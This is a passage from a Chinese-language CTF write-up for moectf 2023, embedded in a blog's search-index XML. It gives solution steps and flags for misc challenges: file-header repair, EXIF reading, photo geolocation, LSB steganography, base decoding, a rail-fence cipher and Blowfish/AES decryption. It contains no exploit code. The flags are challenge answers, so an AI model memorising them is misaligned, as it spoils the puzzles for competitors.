</p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;you_KNow_how_to_faCtorize_N_right?_9?WPIBung6?WPIBung6?WPIBund6?&#125;<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h3 id="Misc-入门指北"><a href="#Misc-入门指北" class="headerlink" title="Misc 入门指北"></a><strong>Misc</strong> <strong>入门指北</strong></h3><p>​    Base64解密</p><p>flag：moectf{h@v3_fun_@t_m15c_!}</p><h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a><strong>打不开的图片1</strong></h3><p>用010editor打开，发现是jpg格式文件，修复文件头，可以打开，有exif信息，16进制转换得flag</p><p>Flag：moectf{XDU_i5_v3ry_6e@u2ifu1}</p><h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a><strong>打不开的图片2</strong></h3><p>​    用010editor打开，发现ihdr，查看文件尾，为png文件尾，修复文件头，成功打开图片得到flag</p><img src="/2023/10/01/moectf2023/clip_image024.jpg" class title="img"><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a><strong>狗子(1) 普通的猫</strong></h3><p>​    用010editor打开,文件尾部找到flag</p><p>Flag: </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;eeeez_f1ag_as_<span class="hljs-built_in">A_G1ft</span>!&#125;<br></code></pre></td></tr></table></figure><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a><strong>building_near_lake</strong></h3><p>​    下载图片可以查询到拍摄信息，照相机制造商为Xiaomi，型号为22122RK93C，搜素发现是红米k60，搜索发布会时间，得到20221227，百度识图发现拍摄地点是厦门大学翔安德望图书馆，地图查询经纬度，得到flag</p><img src="/2023/10/01/moectf2023/clip_image026.png" class title="img"><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a><strong>烫烫烫</strong></h3><p>​    转储utf-7，正常显示，</p><img src="/2023/10/01/moectf2023/clip_image028.png" class title="img"><p>计算key——b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1，进行aes计算，得flag</p><p>Flag：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">moectf&#123;<span class="hljs-symbol">codep@</span><span class="hljs-symbol">ge_pl@</span><span class="hljs-symbol">ys_@</span><span class="hljs-symbol">n_iMport@</span><span class="hljs-symbol">nt_role_in_intern@</span><span class="hljs-symbol">tion@</span><span class="hljs-symbol">liz@</span>tion_g92WPIB&#125;<br></code></pre></td></tr></table></figure><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a><strong>狗子(2) 照片</strong></h3><p>​    用zsteg跑lsb，得flag</p><p>Flag：moectf{D0ggy_H1dd3n_1n_Pho7o_With_LSB!}</p><h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a><strong>base乐队</strong></h3><p>​    依次用base32、base58、base32解密得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">bYeNQXYZXbXZQfW31FGzzD0m0FHQ9RR85FFQYMB9M</span><span class="hljs-operator">=</span>lmo2ku11z0uiz<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>发现中间有&#x3D;，目前已知出现&#x3D;均是在字符串尾部，猜测通过某种加密将&#x3D;放在了中间，尝试暴力栅栏，得到flag</p><p>flag：moectf{Th4_6@nd_1nc1ud45_F3nc4_@nd_b@s3}</p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a><strong>奇怪的压缩包</strong></h3><p>​    压缩包打开，发现有个文件夹为ppt，根据题目描述，改后缀，成功得到ppt文件，通过改字体颜色、遮挡、批注、解压ppt文档隐藏</p><p>Flag：moectf{2ip123456_?_ n0_i4_pp4x!}</p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a><strong>机位查询</strong></h3><p>   三张图片的地点均在广西南宁，分别是南宁站、中山路美食街、华润大厦，查卫星地图可分析得到前两张图片拍摄地点为嘉士摩根国际、百盛步行街广场，最后一张始终分析不出拍摄的地点，仔细查看，发现有exif信息，有gps定位，查询，找到汇金宛，</p><img src="/2023/10/01/moectf2023/clip_image030.png" class title="img"><p>Flag：moectf{jiashi_baisheng_huijin}</p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a><strong>狗子(3) 寝室</strong></h3><p>​     编写压缩包解压脚本或工具解压，得到flag.txt</p><p>Flag: moectf{Ca7_s133p1ng_und3r_zip_5hell5}</p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a><strong>尊嘟假嘟？</strong></h3><p>​     根据hint1涉及到base58，尝试base58解密</p><img src="/2023/10/01/moectf2023/clip_image032.png" class title="img"><p>一堆乱码，而hint2提示为bl*****sh加密，想到blowfish，将key和iv求出，带入解密，得到一个可疑字符串</p><img src="/2023/10/01/moectf2023/clip_image034.png" class title="img"><p>再进行base64解密，得到flag</p><img src="/2023/10/01/moectf2023/clip_image036.png" class title="img">]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
